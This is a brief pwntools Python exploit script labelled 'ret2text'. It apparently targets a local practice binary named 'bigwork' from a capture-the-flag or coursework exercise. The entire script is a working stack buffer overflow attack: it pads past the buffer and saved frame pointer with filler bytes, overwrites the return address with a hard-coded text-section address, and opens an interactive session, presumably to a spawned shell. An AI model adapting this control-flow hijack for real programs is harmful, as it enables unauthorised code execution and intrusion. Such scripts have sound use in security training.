# ret2text
from pwn import *

p = process('../src/bigwork')

addr = p64(0x000000000040121E)

pyload = ('0' * 0x30 + 'b' * 0x08).encode() + addr

p.sendline('1'.encode())
p.sendline(pyload)

p.interactive()
